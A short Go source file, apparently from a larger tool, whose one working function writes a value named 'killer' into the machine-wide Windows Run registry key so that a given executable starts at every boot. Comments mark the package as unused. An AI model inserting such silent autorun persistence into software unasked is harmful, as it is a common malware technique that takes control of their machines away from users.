package ref
//无需使用此包 可删
import (
	"fmt"
	"log"

	"golang.org/x/sys/windows/registry"
)

//maybe not used
func ModifyRegistry(local string) {
	var registryRoad string = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
	//查询注册表目的键值是否已经创建
	key, exists, err := registry.CreateKey(registry.LOCAL_MACHINE, registryRoad, registry.ALL_ACCESS) //loacl_machine 为主键
	//key, err:=registry.OpenKey(registry.LOCAL_MACHINE, registryRoad, registry.ALL_ACCESS)
	//ALL_ACCESS may be only for system32?
	if err != nil {
		fmt.Println("!1")
		log.Print(err)

	}

	fmt.Println(key, exists)
	if exists {
		fmt.Printf("the key has been created")
		fmt.Printf("\n")
		key.SetStringValue("killer", local)
		//registry.DeleteKey(registry.LOCAL_MACHINE, registryRoad)
		//fmt.Print("it has been deleted")

	} else {
		//start to create the key
		//key.SetStringValue("Killer", local)
		fmt.Print("the key is not exists")
		key.SetStringValue("killer", local)

	}
	defer key.Close()
}
//delete
func Banner(){
	//var registryRoad string="HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
}